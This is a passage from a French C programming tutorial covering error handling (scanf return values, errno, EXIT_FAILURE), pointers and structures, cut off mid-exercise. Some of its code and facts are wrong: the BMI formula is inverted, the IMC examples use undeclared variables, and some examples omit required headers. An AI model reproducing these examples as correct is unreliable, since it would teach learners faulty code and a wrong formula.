puissances à chaque fois. En effet, $x&#94;{n+1} = x&#94;n \\times x$. Il suffit de connaître $x&#94;n$. Le principe est le même pour la factorielle : $(x+1)! = x! \\times (x + 1)$. } Pour ceux qui auraient besoin, l'algorithme est disponible à cette adresse . Enfin, pour ceux qui ont fini ou qui veulent s'aider de la correction, elle se trouve ici . Autres Pour votre information, le calcul des fonctions logarithme, sinus, cosinus, tangente, et leurs réciproque, peut s'effectuer aussi avec des développements limités. Les formules sont facilement trouvables sur la toile : Wikipédia est votre allié. Ce chapitre a peut-être été indigeste pour ceux qui détestent les maths, mais au moins il nous a permit d'apprendre de nouvelles fonctions et de découvrir le principe des bibliothèques. Et puis dites vous que faire des maths de temps en temps n'a jamais tué personne. La gestion d'erreur Dans les chapitres précédents, nous vous avons présenté des exemples simplifiés afin de vous familiariser avec le langage. Aussi, nous avons pris soin de ne pas effectuer de vérification quant à d'éventuelles rencontres d'erreurs. Mais à présent : c'est fini ! Vous disposez désormais d'un bagage suffisant pour affronter la dure réalité d'un programmeur : des fois, il y a des trucs qui foirent et il est nécessaire de le prévoir. Nous allons voir comment dans ce chapitre. Détection des erreurs La première chose à faire pour gérer d'éventuelles erreurs lors de l'exécution, c'est avant tout de les détecter. Par exemple, quand vous executez une fonction, et qu'une erreur a lieu lors de son exécution, celle-ci doit vous prévenir d'une manière ou d'une autre. Et elle peut le faire de deux manières différentes. Valeurs de retour Peut-être l'avez vous déjà remarqué : certaines fonctions, comme scanf () et printf (), retournent un nombre (souvent un entier) alors que nous n'attendons finalement aucune valeur de celles-ci. Pourquoi diable ces dernières retournent-elles quelque chose alors qu'elles ne calculent par exemple pas un résultat comme la fonction pow () ? Hé bien, je vous le donne en mille : ces valeurs servent en fait à vous signifier si l'exécution de la fonction s'est bien déroulée. Scanf Prenons l'exemple de la fonction scanf () : cette dernière retourne le nombre de conversions réussies ou un nombre inférieur si elles n'ont pas toutes été réalisée ou enfin un nombre négatif en cas d'erreur. Ainsi, si nous souhaitons récupérer deux entiers et être certains que scanf () les a récupéré, nous pouvons utiliser le code suivant : #include <stdio.h> int main ( void ) { int x ; int y ; printf ( \"Entrez deux nombres : \" ); if ( scanf ( \"%d %d\" , & x , & y ) == 2 ) { printf ( \"Vous avez entre : %d et %d \\n \" , x , y ); } return 0 ; } Entrez deux nombres : 1 2 Vous avez entre : 1 et 2 Entrez deux nombres : 1 a Comme vous pouvez le constater, le programme n'exécute pas l'affichage des nombres dans les deux derniers cas, car scanf () n'a pas réussi à réaliser deux conversions. Main Maintenant que vous savez cela, regarder bien votre fonction main () : int main ( void ) { return 0 ; } Vous ne voyez rien qui vous interpelle ? :) Oui, vous avez bien vu, elle retourne un entier qui, comme pour scanf (), sert à indiquer la présence d'erreur. En fait, il y a deux valeurs possibles : EXIT_SUCCESS (ou zéro, cela revient au même), qui indique que tout s'est bien passé ; et EXIT_FAILURE, qui indique un échec du programme. Ces deux constantes sont définies dans l'en-tête <stdlib.h> ). Les autres fonctions Sachez que scanf (), printf () et main () ne sont pas les seules fonctions qui retournent des entiers, en fait quasiment toutes les fonctions de la bibliothèque standard le font. -- Ok, mais je fais comment pour savoir ce que retourne une fonction ? À l'aide de la documentation. Vous disposez de la norme (enfin, du brouillon de celle-ci) qui reste la référence ultime, sinon vous pouvez également utiliser un moteur de recherche avec la requête man nom_de_fonction afin d'obtenir les informations dont vous avez besoin. Note : Si vous êtes anglophobe, une traduction française de diverses descriptions est disponible à cette adresse , vous les trouverez à la section trois. Variable globale errno Le retour des fonctions est un vecteur très pratique pour signaler une erreur. Cependant, il n'est pas toujours utilisable. En effet, nous avons vu au chapitre précédent différentes fonctions mathématiques. Or, ces dernières utilisent déjà leur retour pour transmettre le résultat d'une opération. Comment faire dès lors pour signaler un problème ? Une première idée serait d'utiliser une valeur particulière, comme zéro par exemple. Toutefois, ce n'est pas satisfaisant puisque, par exemple, les fonctions pow () ou sin () peuvent parfaitement retourner zéro lors d'un fonctionnement normal. Que faire alors ? Dans une telle situation, il ne reste qu'une seule solution : utiliser un autre canal, en l'occurrence une variable globale. La bibliothèque standard fourni une variable globale nomée errno (elle est déclarée dans l'en-tête <errno.h> ) qui permet à différentes fonctions d'indiquer une erreur en modifiant la valeur de celle-ci. Note : Une valeur de zéro indique qu'aucune erreur n'est survenue. Les fonctions mathématiques recourent abondamment à cette fonction. Prenons l'exemple suivant : #include <errno.h> #include <stdio.h> int main ( void ) { double x ; errno = 0 ; x = pow ( - 1 , 0.5 ); if ( errno == 0 ) { printf ( \"x = %f \\n \" , x ); } return 0 ; } Le calcul demandé revient à demander le résultat de l'expression $-1&#94;\\frac{1}{2}$, autrement dit, de cette expression : $\\sqrt{-1}$, ce qui est impossible dans l'essemble des réels. Aussi, la fonction pow () modifie la variable errno pour vous signifier qu'elle n'a pas pu calculer l'expression demandée. Une petite précision concernant ce code et la variable errno : celle-ci doit toujours être mise à zéro avant d'appeler une fonction qui est susceptible de la modifier, ceci afin de vous assurez qu'elle ne contient pas la valeur qu'une autre fonction lui a assignée. Imaginez que vous ayez auparavant appelé pow () et que cette dernière à échoué, si vous l'appelez à nouveau, la valeur de errno sera toujours celle assignée par lors de l'appel précédent. Note : La bibliothèque standard ne prévoit en fait que deux valeurs d'erreur possibles pour errno : EDOM (pour le cas où le résultat d'une fonction mathématique est impossible) et ERANGE (en cas de dépassement de capacité, nous y reviendrons plus tard). Ces deux constantes sont définies dans l'en-tête <errno.h> . Prévenir l'utilisateur Savoir qu'une erreur s'est produite, c'est bien, le signaler à l'utilisateur, c'est mieux. Ne laisser pas votre utilisateur dans le vide, s'il se passe quelque chose, dite le lui. #include <stdio.h> int main ( void ) { int x ; int y ; printf ( \"Entrez deux nombres : \" ); if ( scanf ( \"%d %d\" , & x , & y ) == 2 ) { printf ( \"Vous avez entre : %d et %d \\n \" , x , y ); } else { printf ( \"Vous devez saisir deux nombres ! \\n \" ); } return 0 ; } Entrez deux nombres : a b Vous devez saisir deux nombres ! Entrez deux nombres : 1 2 Vous avez entre : 1 et 2 Simple, mais tellement plus agréable. ;) Dans l'exemple situé plus haut, nous avons affiché les messages d'erreurs à grand coup de printf(). Nous verrons plus tard dans le tutoriel qu'il existe d'autres façons un peu plus propres d'afficher des messages d'erreurs. Nous ne pouvons pas en dire plus pour le moment, vu qu'il nous faudrait aborder les notions de flux (et notamment le flux stderr),ce qui ne peut être fait que bien plus tard dans ce cours. Un exemple d'utilisation des valeurs de retour Maintenant que vous savez tout cela, il vous est possible de modifier le code utilisant la fonction scanf () pour vérifier si celle-ci a réussi et, si ce n'est pas le cas, préciser à l'utilisateur qu'une erreur est survenue et quitter la fonction main () en retournant la valeur EXIT_FAILURE. #include <stdio.h> int main ( void ) { int x ; int y ; printf ( \"Entrez deux nombres : \" ); if ( scanf ( \"%d %d\" , & x , & y ) != 2 ) { printf ( \"Vous devez saisir deux nombres ! \\n \" ); return EXIT_FAILURE ; } printf ( \"Vous avez entre : %d et %d \\n \" , x , y ); return 0 ; } Ceci nous permet de réduire un peu la taille de notre code en éliminant directement les cas d'erreurs. Bien, vous voilà à présent fin prêt pour la deuxième partie du cours et ses vrais exemples. Plus de pitié donc : gare à vos fesses si vous ne vérifiez pas le comportement des fonctions que vous appeler ! Cette première partie nous a présenté de nombreuses notions, n'hésitez pas à la relire si vous en ressentez le besoin. Cependant, le C ne se limite pas qu'à ces notions de bases. En effet, il existe des concepts plus poussés, plus complexes mais plus puissants que nous allons découvrir dans la partie 2. Les agrégats Dans cette seconde partie, nous allons aborder des aspects du C certes plus complexes mais aussi beaucoup plus puissants que ceux que nous avons vu : les agrégats , c'est à dire un regroupement de plusieurs notions différentes. Ne soyez pas rebutés s'il y a des choses que vous ne comprenez pas de prime abord : c'est normal, tout le monde est passé par là. Relisez à tête reposée, testez, lisez sur Internet, bref, ne restez pas bloqués. Vous verrez que le jeu en vaut la chandelle puisque nous pourrons faire beaucoup plus de choses dans nos programmes avec ces nouveaux concept ! Les pointeurs Bon, dans les chapitres précédents, on a vu pas mal de choses : comment créer et utiliser des variables, des structures de contrôle, ou des fonctions. Ces opérations sont assez basiques, et on n'est pas vraiment rentré dans le vif du sujet. Mais maintenant, cela va changer ! Nous allons aborder les pointeurs, un mécanisme du langage C qui fait peur à certains. Pourtant, elle est derrière une grande partie des fonctionnalités des langages de programmation actuels : on en trouve partout ! Le C n'échappe pas à cette règle, et les pointeurs sont une fonctionnalité majeure du langage. Mais contrairement au langage C, la plupart des langages les cachent et les camouflent plus ou moins efficacement. Il faut dire que les pointeurs ont une très mauvaise réputation : ils seraient difficiles à comprendre, difficiles à maitriser, et d'une complexité qui ferait fuir tous les débutants. Mais il s'agit bien évidemment d'idées reçues. La raison à cette mauvaise réputation qu'ont les pointeurs est simple : les pointeurs sont ce qu'on appelle une fonctionnalité bas niveau . En clair, il s'agit d'un mécanisme qui nécessite de comprendre quelques détails sur le fonctionnement d'un ordinateur pour être comprise ou utilisée correctement. En effet, pour comprendre les pointeurs, il suffit de comprendre un tout petit peu ce qu'est la mémoire RAM. Rien de bien compliqué : seuls quelques rappels suffiront. Vous allez voir, contrairement à ce qu'on pense, ces pointeurs ne sont pas compliqués : c'est même le contraire ! C'est quoi ? Tout d'abord, nous allons devoir parler de l'utilité de ces pointeurs. Et quelques rappels sont nécessaires. Utilité Comme nous l'avons vu dans le chapitre sur les variables, une donnée est stockée dans une mémoire bien particulière de notre ordinateur : registre, RAM, etc. Seulement, pour pouvoir utiliser cette donnée, nous avons besoin de savoir où elle se situe exactement dans la mémoire. Ce moyen s'appelle une référence . Nos variables simples, comme des int , float , double , ou char individuels sont directement gérées par le compilateur, qui les charge le plus souvent dans les registres. On n'a pas besoin de manipuler de références vers ces derniers : les noms de variables suffisent pour le programmeur. Créations de structures de données Mais pour les autres données, c'est une autre histoire. Eh oui : en C, il est possible d'utiliser des données plus grosses que des simples variables. Ces données complexes sont crées en regroupant ensemble des variables de type int , float , double , ou char . L'ensemble est souvent trop gros pour être stocké dans des registres, et est placé en mémoire RAM. Conséquence : on ne peut pas manipuler ces regroupements directement, et on est obligé de manipuler les variables élémentaires unes par unes, ce qui demande de connaitre la position en RAM de celles-ci. Allocation dynamique Enfin, il faut savoir qu'il est possible de réserver temporairement une portion inutilisée de la mémoire pour stocker temporairement des données ou des variables. Quand on n'a plus besoin de cette portion de mémoire, il la libère, et elle sera réutilisable à volonté. C'est ce qu'on appelle l'allocation dynamique. Le seul problème, c'est que l'emplacement de la portion de mémoire change à chaque réservation. On doit donc se souvenir de cet emplacement, sans quoi le manipuler sera impossible. Et c'est encore une fois au programmeur de gérer cela, du moins en partie. Passage de données complexes en argument de fonctions Autre exemple : si je veux qu'une fonction manipule une donnée, je peux passer celle-ci en argument de ma fonction. Elle sera alors recopiée, et ma fonction manipulera la copie. Dans certains cas, on voudra programmer une fonction qui modifie directement l'original et non une copie. Mais pour envoyer l'original à notre fonction, on doit dire à notre fonction où est l'original dans la mémoire. La RAM Bref, c'est (entre autres) à cela que servent les pointeurs : ils servent à donner l'emplacement en mémoire RAM d'une donnée précise pour qu'on puisse la manipuler. Reste à savoir comment ils font. Dans notre RAM, les données sont découpées en \"paquets\" contenant une quantité fixe de bits : des \" cases mémoires \", aussi appelées bytes . Généralement, nos mémoires utilisent un byte de 8 bits, aussi appelé octet . Avec un octet, on peut stocker 256 informations différentes. Pour stocker plus d'informations (par exemple les nombres de -1024 à 1023), on peut utiliser plusieurs octets, et répartir nos informations dedans. Nos données peuvent prendre un ou plusieurs octets qui se suivent en mémoire, sans que cela pose problème : nos mémoires et nos processeurs sont conçus pour gérer ce genre de situations facilement. En effet, nos processeurs peuvent parfaitement aller lire 1, 2, 3, 4, etc. octets consécutifs d'un seul coup sans problème, et les manipuler en une seule fois. Mais cela ne marche que pour des données simples. Chacun de ces octets se voit attribuer un nombre unique, l'adresse , qui va permettre de la sélectionner et de l'identifier celle-ci parmi toutes les autres. Il faut imaginer la mémoire RAM de l'ordinateur comme une immense armoire, qui contiendrait beaucoup de tiroirs (les cases mémoires) pouvant chacun contenir un octet. Chaque tiroir se voit attribuer un numéro pour le reconnaitre parmi tous les autres. On pourra ainsi dire : je veux le contenu du tiroir numéro 27 ! Pour la mémoire c'est pareil. Chaque case mémoire a un numéro : son adresse. Adresse Contenu mémoire 0 11101010 01011010 1 01111111 01110010< 2 00000000 01111100 3 01010101 0000000< 4 10101010 00001111 5 00000000 11000011 En fait, on peut comparer une adresse à un numéro de téléphone (ou à une adresse d'appartement) : chacun de vos correspondants a un numéro de téléphone et vous savez que pour appeler telle personne, vous devez composer tel numéro. Ben les adresses mémoires, c'est pareil ! Pointeurs Nous y voilà : ce qu'il nous faut, c'est donc réussir à stocker l'adresse mémoire à laquelle commence une donnée, et la manipuler comme bon nous semble. Pour cela, on a inventé les pointeurs : ce sont des variables dont le contenu est une adresse mémoire. C'est aussi simple que cela. Leur utilité ne semble pas évidente au premier abord, mais sachez que cela deviendra plus clair après quelques exemples. De plus, nous utiliserons beaucoup les notions vues dans ce chapitre une fois qu'on parlera des tableaux et des structures de données. Cela ne se voit pas au premier abord, mais les pointeurs sont importants dans le langage C. Utilisation Avant de rentrer dans le vif du sujet, il faut encore faire quelques remarques sur nos fameux pointeurs. Cette fois-ci, on va rentrer vraiment dans la pratique : finie la théorie, on va parler de choses spécifiques au langage C. En C, les pointeurs sont typés : les pointeurs qui stockent l'adresse d'un int ou d'un char seront différents. C'est comme ça, les pointeurs vont stocker les adresses mémoires d'une donnée simple, qui peut être un int , un char , un float ou un double . Le type du pointeur sert à préciser si l'adresse contenue dans ce pointeur est l'adresse d'un int , d'un char , d'un float , etc. Vous vous demandez surement à quoi peut bien servir cette bizarrerie. Tout ce que je peux dire pour le moment, c'est que c'est dû au fait que des données de type différent n'occuperont pas la même quantité de mémoire : suivant la machine, un int peut ne pas avoir la même taille qu'un short , par exemple. Pour éviter les ennuis lors des manipulations de pointeurs, les pointeurs sont donc typés. Vous verrez quand on abordera l'arithmétique des pointeurs : on devra calculer des adresses mémoires, et la taille des types jouera beaucoup lors de ces calculs. Vous comprendrez alors l'utilité du typage des pointeurs. Déclaration Pour déclarer un pointeur, il suffit de lui donner un nom, et de préciser son type, c'est-à-dire le type de la donnée dont on stocke l'adresse dans le pointeur. La syntaxe de la déclaration est celle-ci : type * nom_du_pointeur ; Par exemple, si je veux créer un pointeur sur un int (c'est-à-dire un pointeur pouvant stocker l'adresse d'une variable de type int ) et que je veux le nommer ptr , je devrais écrire ceci : int * ptr ; Un pointeur particulier Nous venons de dire qu'un pointeur devait forcément pointer sur un objet d'un type donné. A priori, il semble impossible de faire un pointeur qui pourrait pointer sur n'importe quel type d'objet sans problème. Pourtant, les concepteurs de la norme C89 ont pensé à nous : ils ont introduit un pointeur un peu spécial appelé pointeur universel : void * . Ce dernier peut se voir assigner n'importe quel type de pointeur et peut lui-même être converti en n'importe quel type de pointeur. int * p = 0 ; void * uni = p ; /* (int *) -> (void *) */ int * q = uni ; /* (void *) -> (int *) */ Dans cet exemple, le pointeur uni se voit assigner un pointeur sur int et est ensuite assigner au pointeur q sans que cela pose le moindre problème. Faites attention cependant : un pointeur générique ne peut pas être déréférencé (voyez la section qui y est dédiée un peu plus bas), il doit faire l'objet d'une conversion explicite auparavant. Pour la touche culturelle, sachez qu'avant l'apparition de la norme C89 le pointeur universel n'existait pas. On utilisait à la place un pointeur sur char . Référencement Le référencement est une opération qui permet de récupérer l'adresse d'un objet. Pour se faire, il suffit de placer l'opérateur & devant la variable dont on souhaite récupérer l'adresse. Pour l'afficher, on utilise printf avec un nouvel indicateur de conversion : %p qui affiche le résultat en hexadécimal. Il y a cependant une petite contrainte : il faut convertir le pointeur en void* . int ma_variable ; printf ( \"Adresse de ma_variable : %p \\n \" , ( void * ) & ma_variable ); Adresse de ma_variable : 0x7fff9ee178ac Cette valeur change à chaque exécution, ne vous inquiétez pas si vous n'obtenez pas le même résultat que moi. Initialisation et pointeur nul Un pointeur, comme une variable, ne possède pas de valeur par défaut. Il pointe donc sur n'importe quoi, n'importe où en mémoire. Il est donc important de l'initialiser pour éviter d'éventuels problèmes. Pour se faire, il y a deux possibilités : soit l'initialiser à une valeur nulle, soit l'initialiser avec une adresse. Initialisation avec une adresse valide Pour commencer, on peut initialiser un pointeur avec une adresse, que ce soit celle d'une variable ou le retour d'une fonction renvoyant un pointeur. int ma_variable = 10 ; int * mon_pointeur ; mon_pointeur = & ma_variable ; Ou même ainsi : int ma_variable = 10 ; int * mon_pointeur = & ma_variable ; Pointeur NULL Mais il arrive qu'on doive déclarer un pointeur sans savoir quelle adresse mettre dedans, cette adresse étant disponible plus tard, plus loin dans le code. Dans ce cas, on peut donner une valeur particulière au pointeur pour faire en sorte qu'il ne pointe nulle part et qu'il soit considéré comme invalide. Cette valeur particulière s'appelle NULL . /* maintenant ptr est un pointeur invalide */ int * ptr = NULL ; Déréférencement S'il est possible de récupérer l'adresse d'un objet grâce au référencement, il est également possible d'accéder et de modifier cet objet grâce au déréférencement . Sans cette possibilité, les pointeurs n'auraient aucune utilité. Cette opération se fait avec l'opérateur * . Avec la syntaxe *mon_pointeur , nous avons accès à la donnée contenue à l'adresse de mon_pointeur aussi bien en lecture qu'en écriture. C'est le cas dans le premier exemple ci-dessous où l'on affecte à une variable la valeur du contenu du pointeur, c'est-à-dire la valeur de ma_variable . int a = 0 ; int ma_variable = 10 ; int * mon_pointeur = & ma_variable ; a = * mon_pointeur ; printf ( \"Valeur contenue a l'adresse '%p' : %d \\n \" , ( void * ) mon_pointeur , a ); Valeur contenue à l'adresse '0x7ffa2ee591a7' : 10 Dans le deuxième exemple, on modifie la valeur de l'objet pointé par mon_pointeur , c'est à dire qu'indirectement on modifie ma_variable . int ma_variable = 10 ; int * mon_pointeur = & ma_variable ; printf ( \"Valeur contenue à l'adresse '%p' : %d \\n \" , ( void * ) mon_pointeur , * mon_pointeur ); * mon_pointeur = 20 ; printf ( \"Valeur contenue à l'adresse '%p' : %d \\n \" , ( void * ) mon_pointeur , * mon_pointeur ); Valeur contenue à l'adresse '0028FF18' : 10 Valeur contenue à l'adresse '0028FF18' : 20 Des pointeurs comme arguments dans des fonctions Il existe deux manières d'utiliser les pointeurs avec les fonctions. Voici la première : #include <stdio.h> void ma_fonction ( int * mon_pointeur ) { * mon_pointeur = 20 ; } int main ( void ) { int ma_variable = 10 ; ma_fonction ( & ma_variable ); printf ( \"Valeur de ma_variable : %d \\n \" , ma_variable ); return 0 ; } Là, il n'y a rien de très difficile : on envoie l'adresse de ma_variable à ma_fonction puis celle-ci modifie la valeur de ma_variable directement en mémoire par l'intermédiaire de mon_pointeur . Quel est l'intérêt d'utiliser les pointeurs à la place de return ? On peut par exemple modifier la valeur de plusieurs variables dans une fonction au lieu de ne pouvoir en modifier qu'une qu'on retourne. Passons maintenant à la deuxième technique pour envoyer un ou plusieurs pointeurs à une fonction : #include <stdio.h> void ma_fonction ( int * mon_pointeur ) { * mon_pointeur = 20 ; } int main ( void ) { int ma_variable = 10 ; int * mon_pointeur = & ma_variable ; ma_fonction ( mon_pointeur ); printf ( \"Valeur de ma_variable : %d \\n \" , ma_variable ); printf ( \"Valeur contenue a l'adresse de mon_pointeur : %d \\n \" , * mon_pointeur ); return 0 ; } Sans exécuter ce code, essayez de deviner quel sera le résultat de ces deux printf . Trouvé ? Si ce n'est pas le cas, relisez entièrement et très attentivement ce chapitre. Voici le résultat attendu : Valeur de ma_variable : 20 Valeur contenue à l'adresse de mon_pointeur : 20 Un grand bravo à tous ce qui ont compris cela dès le premier coup ! Pour les autres, ne vous en faites pas, ça va venir petit à petit. Exercice Pour le moment, vous vous dites surement que les pointeurs ne sont pas forcément nécessaires, et qu'on peut surement s'en passer. De nombreux débutants en C se disent cela, et c'est une des raisons qui fait que certains ne comprennent pas facilement les pointeurs. À ce stade du tutoriel, il sera difficile de vous montrer leur utilité, même si la suite du tutoriel vous prouvera le contraire. Néanmoins, cet exercice va vous montrer que les pointeurs peuvent parfois être utiles. En effet, nos pointeurs sont utiles en argument des fonctions. C'est ainsi : dans une fonction, il est impossible de modifier les arguments : on ne fait que manipuler une copie de ceux-ci ! Si jamais notre fonction doit manipuler un ou plusieurs des arguments pour le modifier, on ne peut pas le faire avec une fonction. Du moins, pas sans nos pointeurs. Énoncés Pour mieux comprendre, on va vous donner un exemple pratique. Vous aller devoir programmer une fonction nommé swap , qui va échanger le contenu de deux variables. Cette fonction ne semble pas bien méchante, mais sachez qu'elle est assez utilisée, mine de rien. Par exemple, si vous voulez trier un gros paquet de données, vous aurez absolument besoin de cette fonction. Mais je n'en dit pas plus. Quoiqu'il en soit, on va supposer que dans notre exemple, nos deux variables sont des int . Bonne chance ! Correction Celle-ci se trouve sur à la même adresse que d'habitude . Bref, nous en avons fini avec les pointeurs. Du moins, pour le moment. Car après tout, les pointeurs sont omniprésents en langage C et nous n'avons pas fini d'en entendre parler. Mais pour le moment, nous allons découvrir ces fameuses données complexes dont nous avons parlé en début de chapitre avec ce qu'on appelle les structures . Structures Dans le chapitre précédent, nous avions dit que les pointeurs étaient utiles pour manipuler des données complexes. Les structures sont les premières que nous allons étudier. Qu'est ce qu'une structure ? Il s'agit d'un regroupement de variables différentes sous le même nom. En gros, une structure est une grosse boite qui regroupe plein de données différentes. Plein de parallèles avec le monde réel sont possibles. Prenez un salarié par exemple : il a un sexe, un âge, un salaire, un véhicule de fonction ou non, etc. Au lieu de créer une variable pour chaque donnée, on les regroupe toutes dans une sorte de \"grosse variable\" qui contient toutes les autres, la structure. Si cette illustration vous parait abstraite, lisez la suite qui montre une utilisation concrète en C. Déclaration, définition et initialisation Pour gérer ces structures, on va devoir apprendre à en définir le contenu, puis à déclarer des variables de type structure et les initialiser. Commençons par la définition. Définition Par définir une structure, nous ne voulons pas dire créer une variable qui soit une structure. Cela sera pour plus tard. Avant de créer des variables structurées, nous devons indiquer à notre compilateur comment est organisée la structure que l'on veut créer. Cela veut simplement dire quels sont les types des variables qu'on rassemble, comment est organisée la structure, etc. Le squelette de toute structure est le suivant : struct Identificateur { /* les variables à déclarer */ }; Décortiquons le tout. Le mot-clef struct est important, il permet d'indiquer au compilateur que l'on déclare une structure. Notez également que le point-virgule à la fin est obligatoire, sinon vous aurez des erreurs à la compilation. Les objets que l'on défini dans le bloc de code vu au-dessus sont quant à eux appelés les champs ou les membres de la structure. Je suppose que vous vous demandez s'il y a une limite. Je laisse la norme vous répondre : The implementation shall be able to translate and execute at least one program that contains at least one instance of every one of the following limits : 127 members in a single structure or union -- C89 - 2.2.4.1 Translation limits Ne vous inquiétez pas de cette limite, vous n'aurez sûrement jamais à déclarer une structure regroupant 127 variables ou plus. Ensuite, il faut savoir qu'on initialise aucun membre à l'intérieur même de la structure. C'est interdit par le C. En effet, quand nous définissons une structure, aucune variable n'est en jeu : le compilateur ne réserve aucune place en mémoire. Il est donc insensé d'initialiser des variables qui n'existent pas en mémoire. Mais rassurez-vous, nous verrons plusieurs méthodes dans la suite du chapitre pour initialiser nos membres. Enfin, sachez que l'on peut définir une structure tant dans un fichier d'en-tête que dans un fichier source. Cela dépend en fait du contexte : est-ce que la structure est interne à un fichier parce qu'elle a un usage très particulier, ou bien veut-on la partager de manière modulaire (dans ce cas, on la met dans un fichier d'en-tête) ? C'est à vous de voir. Exemple Pour donner un exemple de définition, voici celle d'une structure Personne qui stocke des informations administratives sur quelqu'un : struct Personne { double poids ; double taille ; unsigned int nombre_enfants ; unsigned int age ; double salaire ; }; Déclaration Ensuite, pour déclarer dans notre code un objet de type structure, il suffit de suivre ce schéma : struct NomDeLaStructure identificateur ; La méthode est la même que pour une variable d'un type de base, si ce n'est que le mot-clef struct est obligatoire. Avec notre exemple de la structure Personne , cela donnerait ça : int main ( void ) { struct Personne ma_structure ; return 0 ; } Initialisation Comme je l'ai dit plus haut, il est interdit d'initialiser les champs d'une structures dans le bloc de code vu plus haut. Conséquence : on ne peut pas initialiser ces structures de cette manière et donc il est possible que l'on se retrouve avec des valeurs fantaisistes.. Heureusement, il existe une technique pour initialiser dès la déclaration : struct NomDeLaStructure identificateur = { valeurs que l ' on veut donner aux membres }; Il faut bien sur qu'il y ait autant de valeurs que de membres, et qu'elles soient déclarées dans le même ordre que les membres. Un petit exemple pour mieux visualiser ? C'est d'accord. struct Personne ma_structure = { 60.2 , 175.0 , 0 , 24 , 25000 }; Bien entendu, on peut aussi initialiser chacun des membres à la main si l'on veut. Mais pour le moment, on ne sait pas comment accéder à un membre de notre structure, donc laissons cela pour plus tard. typedef Peut-être certains ce sont déjà posés la question : n'y a t-il pas un moyen d'enlever le mot-clef struct lors de la déclaration ? Eh bien la réponse est oui ! il existe un moyen : typedef . Ce mot-clef sert à définir des synonymes ou alias de types existants. C'est assez utile pour simplifier des déclarations complexes ou longues. Le modèle est le suivant : typedef struct Identificateur Alias ; struct Identificateur { /* champs de la structure */ }; Désormais, écrire struct Identificateur ou Alias revient au même pour le compilateur. A noter qu'il existe une autre possibilité, un peu plus rapide à écrire : typedef struct { /* champs de la structure */ } Identificateur ; Avec cette forme, écrire struct Identificateur ou Identificateur est identique. Le choix de l'une ou l'autre manière n'est pas vraiment important, c'est à vous de choisir celle que vous préférez. Ce tutoriel utilisera quand à lui la seconde forme. Il est aussi important de savoir que certains programmeurs, par soucis de clarté, n'utilisent jamais de typedef pour bien montrer qu'ils utilisent des structures. Utilisation et pointeurs Accès à un membre Pour l'instant, on sait définir une structure, la déclarer, l'initialiser mais on ne sait toujours pas comment accéder aux membres qui la composent. La méthode est très simple, il suffit de faire comme ça : Identificateur.membre; Pour information, si vous utilisez un IDE , lorsque vous taperez le point, il se peut qu'on vous propose une liste des champs de votre structure : c'est l'auto-complétion . Modification d'un membre Il est possible de les modifier les membres d'une structure. Pour cela, on procède ainsi : structure.membre = valeur_à_placer_dans_le_membre; En gros, le membre subit une affectation comme une variable classique. Pointeurs sur structures Comme certains d'entre vous s'en sont peut-être déjà douté, il est possible de déclarer des pointeurs de structures. Le fonctionnement est exactement le même que pour les pointeurs sur des variables \"classiques\". Voici le code précédent qui déclare cette fois un pointeur de structure : struct X * ptr ; Quel est l'intérêt ? Nous l'avons déjà dit dans le chapitre sur les pointeurs : tout argument d'une fonction est recopié, et c'est cette copie qui est utilisée dans la fonction. Vouloir éviter cette recopie peut se justifier dans deux cas : soit on a absolument besoin de manipuler l'original, soit on veut éviter des copies inutiles. Comme justification pour le second cas, il faut savoir qu'une recopie de la structure est une opération qui peut être lourde si la structure est grosse. En utilisant des pointeurs, on accède non plus à une copie mais à la structure elle-même, ce qui est plus rapide et efficace dans une grande majorité de cas. Accès via un pointeur Bon, on sait déclarer des pointeurs sur structures pour passer celles-ci dans nos fonctions. Seulement, accéder à un membre d'une structure via l'identificateur d'une structure, et passer par un pointeur sur structure, ce n'est pas la même chose. Prenons un exemple : je dispose d'une structure qui contient des informations médicales sur une personne. La structure est déclarée comme ceci : typedef struct { double poids ; /* en kilo-grammes */ unsigned int taille ; /* en centimètres */ unsigned int age ; } Personne ; Supposons que je veuille passer cette structure à une fonction chargée de calculer l'IMC de la personne. L'IMC, c'est l'Indice de Masse Corporelle : c'est un indicateur inventé par des statisticiens pour évaluer les risques de mortalité d'une personne en fonction de son poids et de sa taille. Il sert à évaluer si le poids d'une personne est à surveiller ou pas, et est utilisé par certains médecins, combiné avec d'autres analyses. Cet IMC se calcule assez simplement : il suffit d'élever la taille au carré, et de diviser par le poids. On va supposer que je passe cette structure à ma fonction via un pointeur (on pourrait éventuellement faire autrement, mais passons). L'accès aux membres ne pourra pas se faire directement, en utilisant la syntaxe vue plus haut. Ainsi, une fonction comme ceci n'est pas valable : double IMC ( Personne * personne ) { taille = personne . taille ; poids = personne . poids ; return ( taille * taille ) / poids ; } La raison est simple : dans ce code, personne est un pointeur, pas une structure. Pour accéder à un membre, je dois d'abord déréférencer le pointeur pour accéder à ma structure, et ensuite accorder au membre. Soit, faisons-le. Naïvement, on pourrait croire qu'il suffit de faire ceci : double IMC ( Personne * personne ) { taille = * personne . taille ; poids = * personne . poids ; return ( taille * taille ) / poids ; } Mais là encore, vous vous trompez. En fait, il y a un petit piège qui vient des différentes priorités du point et de l'opérateur * (regardez ici pour en apprendre plus). Pour éviter tout problème, vous devez placer des parenthèses autour du * et de l'identificateur. Voici ce que cela donne dans l'exemple : double IMC ( Personne * personne ) { taille = ( * personne ). taille ; poids = ( * personne ). poids ; return ( taille * taille ) / poids ; } Syntaxe alternative Vu que faire ce genre de manipulations est quelque chose de courant, les concepteurs du C ont ajoutés un raccourci qui permet d'aller plus vite. Ainsi, la syntaxe (*structure).membre peut s'écrire aussi structure->membre . Sur l'exemple du haut, cela donnerait : double IMC ( Personne * personne ) { taille = personne -> taille ; poids = personne -> poids ; return ( taille * taille ) / poids ; } Retenez bien cette syntaxe, vous l'utiliserez certainement assez souvent. En fait, c'est même celle qu'utilisent tous les programmeurs. Exercice Nous avons vu dans la partie précédente une syntaxe pour initialiser les structures à leur déclaration. Cependant, ce n'est pas toujours très pratique, notamment quand il y a de nombreux champs à préciser. Une meilleure solution serait de faire une fonction qui prendrait notre structure en paramètre et qui initialiserait tous ces membres. Pour vous entrainer, essayez de faire cette fonction pour la structure Personne . Pour information, si vous connaissez des langages orientés objets, vous reconnaitrez sans doute cette fonction qui n'est d'autre qu'une sorte de constructeur. [secret]{ /* Je n'ai pas mis de typedef pour vous montrer la différence au niveau de la fonction */ struct Personne { double poids ; double taille ; unsigned int nombre_enfants ; unsigned int age ; double salaire ; }; void Personne_Init ( struct Personne * employe ) { employe -> poids = 55 ; employe -> taille = 175 ; employe -> nombre_enfants = 2 ; employe -> age = 30 ; employe -> salaire = 25000 ; } int main ( void ) { struct Personne employe ; Personne_Init ( & 